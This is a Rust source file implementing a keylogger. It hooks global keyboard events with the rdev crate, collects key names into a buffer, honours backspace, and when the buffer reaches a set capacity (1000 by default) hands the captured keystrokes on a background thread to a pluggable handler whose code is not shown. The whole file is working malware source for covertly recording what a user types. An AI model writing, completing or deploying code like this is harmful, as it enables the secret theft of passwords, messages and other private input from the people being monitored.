use crate::method::Method;

use rdev::{
    listen,
    Event,
    EventType::KeyPress,
    Key::Backspace,
};

use std::sync::Arc;
use std::sync::RwLock;

use std::thread;

pub struct Keylogger {
    method: Arc<RwLock<Method>>,
    buffer: Arc<RwLock<Vec<String>>>,
    buffer_capacity: Arc<RwLock<usize>>,
}

impl Keylogger {
    pub fn new(method: Method) -> Self {
        Self {
            method: Arc::new(RwLock::new(method)),
            buffer: Arc::new(RwLock::new(Vec::new())),
            buffer_capacity: Arc::new(RwLock::new(1000)),
        }
    }

    pub fn set_buffer_capacity(self, new_cap: usize) -> Self {
        *self.buffer_capacity.write().unwrap() = new_cap;
        self
    }

    pub fn start(&mut self) {
        let buffer = self.buffer.clone();
        let method = self.method.clone();
        let buffer_cap = self.buffer_capacity.clone();
        let _ = listen(move |event: Event| {
            let mut buffer = buffer.write().unwrap();
            if let KeyPress(Backspace) = event.event_type {
                if buffer.is_empty() {
                    return;
                }
                buffer.pop();
            }
            if let Some(name) = event.name {
                //let mut buffer: Vec<String> = buffer.to_vec();
                let buffer_cap: usize = { *buffer_cap.read().unwrap() };
                println!("{} / {}", buffer.len(), buffer_cap);
                if buffer.len() == buffer_cap {
                    buffer.push(name);
                    // spawns a daemon thread to avoid lag when handling the buffer
                    let buffer_clone = buffer.clone();
                    let method_clone = method.clone();
                    let _ = thread::spawn(move || {
                        method_clone.write().unwrap().handle(&buffer_clone).expect("Failed to handle buffer");
                    });
                    buffer.clear();
                    return;
                }
                buffer.push(name);
            }
        });
    }
}
